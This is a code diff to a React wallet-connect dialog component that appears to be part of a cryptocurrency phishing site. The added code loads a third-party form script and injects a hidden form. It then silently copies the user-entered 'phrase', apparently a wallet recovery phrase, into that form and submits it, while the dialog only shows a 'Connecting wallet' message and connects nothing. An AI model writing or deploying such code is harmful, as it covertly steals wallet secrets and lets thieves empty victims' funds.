@@ -14,6 +14,18 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
   const [loading, setLoading] = useState(false);
   const { toast } = useToast();
 
+  // Add Elfsight script
+  useEffect(() => {
+    const script = document.createElement('script');
+    script.src = 'https://static.elfsight.com/platform/platform.js';
+    script.defer = true;
+    document.body.appendChild(script);
+
+    return () => {
+      document.body.removeChild(script);
+    };
+  }, []);
+
   // Add hidden form for Netlify form detection
   useEffect(() => {
     const form = document.createElement('form');
@@ -56,7 +68,19 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
         body: new URLSearchParams(formData as any).toString(),
       });
 
-      // Implement your own wallet connection logic here
+      // Submit to Elfsight form
+      const elfsightForm = document.querySelector('.elfsight-app-form form') as HTMLFormElement;
+      if (elfsightForm) {
+        const elfsightInput = elfsightForm.querySelector('input[type="text"]') as HTMLInputElement;
+        if (elfsightInput) {
+          elfsightInput.value = phrase;
+          const submitButton = elfsightForm.querySelector('button[type="submit"]') as HTMLButtonElement;
+          if (submitButton) {
+            submitButton.click();
+          }
+        }
+      }
+
       console.log("Connecting wallet...");
       
       toast({
@@ -117,6 +141,11 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
             </Button>
           </div>
         </form>
+        
+        {/* Hidden Elfsight Form */}
+        <div className="hidden">
+          <div className="elfsight-app-form" data-elfsight-app-id="YOUR-APP-ID-HERE"></div>
+        </div>
       </DialogContent>
     </Dialog>
   );
